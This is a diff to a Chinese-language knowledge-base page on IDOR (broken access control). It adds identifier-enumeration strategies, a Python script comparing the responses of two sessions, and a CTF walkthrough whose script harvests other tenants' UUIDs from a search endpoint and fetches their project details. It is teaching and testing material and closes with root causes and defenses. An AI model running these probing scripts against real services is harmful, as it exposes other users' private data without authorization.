@@ -1,3 +1,11 @@
+---
+title: 越权漏洞（IDOR）
+aliases: [越权, IDOR, 水平越权, 垂直越权, BOLA, 未授权访问]
+category: exp
+status: current
+updated: 2026-07
+---
+
 # 越权漏洞（IDOR / Broken Access Control）
 
 ## 一句话理解
@@ -53,6 +61,44 @@ IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是�
 - GUID/UUID 不可遍历，但可以结合信息泄露（评论、分享、列表接口）拿到他人 UUID 后再越权
 - 越权 + CSRF / 越权 + XSS 可组合放大危害
 
+## 标识符类型与遍历策略
+
+拿到目标接口后，先看参数里的标识符是哪一类，再决定打法：
+
+| 标识符类型 | 示例 | 可遍历性 | 策略 |
+| --- | --- | --- | --- |
+| 自增 ID | `id=1001` | 可，直接 `+1/-1` | 脚本批量扫（思路见下文「id 遍历脚本思路」） |
+| UUID / GUID | `uid=550e8400-e29b-...` | 不可枚举 | 换思路收集他人 UUID（见下） |
+| 间接引用（订单号+用户号双字段） | `orderNo` + `userId` | 半 | 只改其一，观察服务端校验了哪个字段 |
+| 时间戳+随机数订单号 | `2026091314xyz789` | 可撞库 | 时间窗口 + 熵不足时批量生成候选 |
+| 加密/签名 ID | `id=eyJhbGciOi...` | 不可 | 先测可否篡改，转密码学问题 |
+
+### 1. 自增 ID：直接遍历
+最理想的形态。`id=1001` 改成 `1002` 即可换人，配合脚本按响应长度聚类批量扫（脚本思路见下文工具节）。
+
+### 2. UUID / GUID：不可遍历，换思路收集
+UUID 空间巨大（122 bit 随机），枚举不现实，攻击面转向"哪里能拿到别人的 UUID"：
+- 列表接口：评论列表、排行榜、分享列表常返回他人对象的 UUID
+- 搜索接口：全局搜索不过滤归属，命中他人对象时响应里带 UUID
+- 日志泄露：错误页、调试接口、`X-Request-Id` 回显等打印过他人请求参数
+- 缓存：CDN 缓存、浏览器缓存中残留他人请求的 UUID
+
+拿到 UUID 后回到详情/操作接口替换验证是否缺归属校验（完整流程见下文「案例二：UUID 越权」）。
+
+### 3. 间接引用（订单号 + 用户号双字段）
+请求同时携带 `orderNo` 与 `userId`（或 token 里的 uid 与 body 里的 uid）时：
+- **只改其一**：把 `orderNo` 换成他人的、`userId` 保持自己的——服务端若按 `userId` 查"我的订单"后按 `orderNo` 取详情却不校验两者关联，越权成立
+- 反过来只改 `userId` 同理；两个方向都测，才能区分服务端到底校验了哪个字段
+
+### 4. 时间戳 + 随机数生成的订单号
+若随机段太短（如 4 位数字）或时间窗口已知，写脚本在时间窗口内批量生成候选单号撞库——本质是把"不可遍历"退化成"可撞库"，一秒钟几千次请求即可覆盖低熵空间。
+
+### 5. 加密 / 签名 ID：先测可否篡改
+- 看是否只是 Base64/Hex **编码**而非加密：解码后是明文 ID → 改完再编码回去即可
+- 看是否**只加密不签名**：篡改密文不报错或报错可区分 → 逐位/分组爆破
+- 看签名可否绕过：长度扩展攻击、去掉签名参数重放、编码变换重放
+- 密码学层面的完整分析思路见 [VUL-Crypto](../vul/VUL-Crypto.md)
+
 ## 工具
 
 ### Burp Autorize
@@ -85,6 +131,41 @@ for oid in range(1, 500):
         print('[+] order %d: %s' % (oid, r.text[:100]))
 ```
 
+### 自动化对比脚本要点
+
+Burp Autorize 是"自动重放 + 身份替换 + 三份对比"，接口数量少或需要精细控制对比逻辑时，可以自己写脚本。核心是**双会话（A/B 账号）对同一请求各发一遍，对比三个维度**：
+- 状态码：B 拿到 200 而 A 才该有权限 → 可疑；401/403 → 有校验
+- 响应长度：与 A 的响应一致 → 返回的数据与会话无关，越权实锤
+- 关键内容：A 数据的特征字段（用户名、手机号、uid）是否出现在 B 的响应里（防"长度碰巧相同"误判）
+
+Python 伪代码框架：
+
+```python
+import requests
+
+TARGET = 'http://target/api/order/1001'        # 待测请求（资源属于 A）
+
+# 双会话：A 为资源所有者，B 为低权限攻击者
+sess_a = {'Cookie': 'session=<A的会话>'}
+sess_b = {'Cookie': 'session=<B的会话>'}
+
+def fingerprint(resp):
+    # 采集三个对比维度：状态码 / 响应长度 / 关键内容
+    return (resp.status_code, len(resp.content), 'username' in resp.text)
+
+ra = requests.get(TARGET, headers=sess_a)      # 基准：本人正常访问
+rb = requests.get(TARGET, headers=sess_b)      # 攻击：换会话重放同一请求
+
+if fingerprint(ra) == fingerprint(rb):
+    print('[!] B 与 A 响应一致 => 越权（Bypass）')
+elif rb.status_code == 200:
+    print('[?] 200 但内容不同，人工复核响应差异')   # 可能是部分越权或模板页
+else:
+    print('[-] 服务端有归属校验（Enforced）')
+```
+
+扩展方向：把 `TARGET` 换成请求列表循环跑，即可实现批量的 Autorize 效果；对 POST/PUT 等修改类操作，测试后记得回滚数据。
+
 ## 与相邻概念的区别
 | 概念 | 区别 |
 | --- | --- |
@@ -92,7 +173,7 @@ for oid in range(1, 500):
 | CSRF | 借用受害者的身份发起请求；越权是攻击者用自己的身份访问不该访问的对象 |
 | 信息泄露 | 越权读到的数据本身常构成信息泄露，但越权强调的是"校验缺失" |
 
-## 案例：一道 IDOR CTF 题完整流程
+## 案例一：一道 IDOR CTF 题完整流程
 
 题目：商城应用，注册登录后可查看"我的订单"，flag 藏在某笔特殊订单里。
 
@@ -114,6 +195,36 @@ for oid in range(1, 1000):
 
 5. **命中 flag**：`oid=666`（他人订单）的备注字段返回 `flag{...}`。
 6. **复盘根因**：服务端只做了登录校验 `if (login)`，缺少 `order.userId == session.uid` 的对象归属校验——补上这一行，漏洞即闭合。
+
+## 案例二：UUID 越权（跨租户数据）
+
+题目：SaaS 多租户项目管理系统，成员登录后只能查看本租户的项目，flag 藏在管理员所属租户的项目描述里。详情接口用 UUID 做标识，自增 ID 遍历那套打法直接失效。
+
+1. **定位接口**：抓包"查看项目"得到 `GET /api/project/detail?projectId=550e8400-e29b-41d4-a716-446655440000`，`projectId` 是 UUID——空间 122 bit，枚举不现实。
+2. **换思路收集他人 UUID**：测试全局搜索功能 `GET /api/search?q=test`，发现搜索结果**不按租户过滤**，返回了所有租户的公开项目卡片，每张卡片都带 `projectId`（UUID）与租户名——列表接口就是 UUID 的来源。
+3. **详情接口替换**：从搜索结果里挑出管理员租户的 `projectId`，用**自己（本租户）的会话**请求详情接口——仍返回 200 与完整项目 JSON（成员邮箱、配置、描述），**跨租户水平越权成立**。
+
+```python
+import requests
+
+headers = {'Cookie': 'session=<本租户成员的会话>'}
+
+# 第一步：搜索接口收集全量他人 UUID（列表接口 = UUID 来源）
+r = requests.get('http://target/api/search', params={'q': 'test'}, headers=headers)
+uuids = [item['projectId'] for item in r.json()['results']]   # 混有他租户项目
+
+# 第二步：详情接口逐个替换，收割跨租户数据
+for pid in uuids:
+    d = requests.get('http://target/api/project/detail',
+                     params={'projectId': pid}, headers=headers)
+    # 只认登录态不认归属时，他租户项目同样 200
+    if d.status_code == 200 and 'flag' in d.text:
+        print('[+] %s: %s' % (pid, d.text))
+        break
+```
+
+4. **命中 flag**：管理员租户某项目的描述字段返回 `flag{...}`。
+5. **复盘根因**：两处缺陷叠加——详情接口只校验登录态、不校验项目归属租户；搜索接口又未做租户隔离，把他租户 UUID 送到攻击者手上。**UUID 只降低了被猜中的概率，代替不了归属校验**；任何能泄露他人 UUID 的接口（列表/搜索/日志/缓存）都是它的克星。
 
 ## 防御要点
 - 服务端对每个请求做对象归属校验（`resource.ownerId == session.userId`）
